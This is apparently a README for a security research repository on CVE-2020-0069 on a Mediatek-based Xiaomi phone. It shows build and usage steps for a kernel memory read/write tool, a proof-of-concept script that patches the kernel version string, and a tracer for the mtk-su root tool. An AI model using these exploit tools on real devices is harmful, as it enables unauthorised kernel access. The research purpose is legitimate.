# Description

This repository contains the materials we used to investigate CVE-2020-0069 on a Xiaomi Redmi 6a (with a Mediatek SoC MT6762M).

There are three programs:

 - ``kernel_rw.c`` a C program allowing to read/write kernel memory
 - ``poc.sh`` a shell script 
 - ``syscall_hook.c`` a C library that can be used to trace the program ``mtk-su`` (tested on version 19)

## Build

To build the binaries:

```
$ ndk-build
```

Then push them on the device:

```bash
$ adb push poc.sh /data/local/tmp
$ adb push libs/armeabi-v7a/kernel_rw /data/local/tmp
$ adb push libs/armeabi-v7a/libsyscall_hook.so /data/local/tmp
```

## Usage

### CVE-2020-0069 PoC

```bash
$ uname -a
Linux localhost 4.9.77+ #1 SMP PREEMPT Mon Jan 21 18:32:19 WIB 2019 armv7l
$ sh poc.sh
[+] Found Linux string at 0x4180bc00
[+] Found Linux string at 0x4180bea0
[+] Write the patched value
$ uname -a
minix  4.9.77+ #1 SMP PREEMPT Mon Jan 21 18:32:19 WIB 2019 armv7l
```

### To trace mtk-su

```bash
$ mkdir mtk-su
$ LD_PRELOAD=./syscall_hook.so ./mtk-su
alloc failed
alloc count=400 startPA=0x53df4000
uncatched ioctl 40e07803
exec command (num 0) ( blockSize=8040, readAddress.count=0 ) dumped into cmd-0
exec command (num 1) ( blockSize=3e0, readAddress.count=1e ) dumped into cmd-1
exec command (num 2) ( blockSize=3e0, readAddress.count=1e ) dumped into cmd-2
[...]
$ cat  mtksu/cmd-1
WFE to_wait=1, wait=1, to_update=1, update=0, event=1da
MOVE 40a68000 into reg 17
READ  address reg 17, data reg b
MOVE startPA+0 into reg 17
WRITE  address reg 17, data reg b
[...]
```
